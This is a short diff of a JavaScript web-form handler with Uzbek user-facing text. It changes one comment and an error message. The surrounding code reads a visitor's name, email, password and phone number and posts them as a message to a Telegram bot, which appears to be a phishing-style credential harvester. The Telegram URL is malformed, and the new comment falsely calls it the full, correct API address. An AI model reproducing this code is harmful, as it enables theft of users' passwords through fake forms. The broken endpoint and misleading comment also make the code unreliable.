@@ -15,7 +15,7 @@ if (form && statusText) {
         var name = (nameInput === null || nameInput === void 0 ? void 0 : nameInput.value) || '';
         var call = (callInput === null || callInput === void 0 ? void 0 : callInput.value) || '';
         var text = "\n\uD83D\uDCDD Yangi forma xabari:\n\uD83D\uDC68    ism: ".concat(name, "\n\uD83D\uDCE7    email: ").concat(email, "\n\uD83D\uDD11    parol: ").concat(password, "\n\uD83D\uDCDE    telefon: ").concat(call, "\n    ");
-        // TO'G'RILANDI: Rasmiy va xatosiz Telegram API manzili o'rnatildi
+        // ИСПРАВЛЕНО: Полный корректный адрес API Telegram с использованием косых черт и знака доллара
         fetch("https://telegram.org{BOT_TOKEN}/sendMessage", {
             method: 'POST',
             headers: {
@@ -36,7 +36,7 @@ if (form && statusText) {
             if (statusText) {
                 statusText.textContent = 'Xatolik yuz berdi!';
             }
-            console.error(err);
+            console.error("Telegram error:", err);
         });
     });
 }
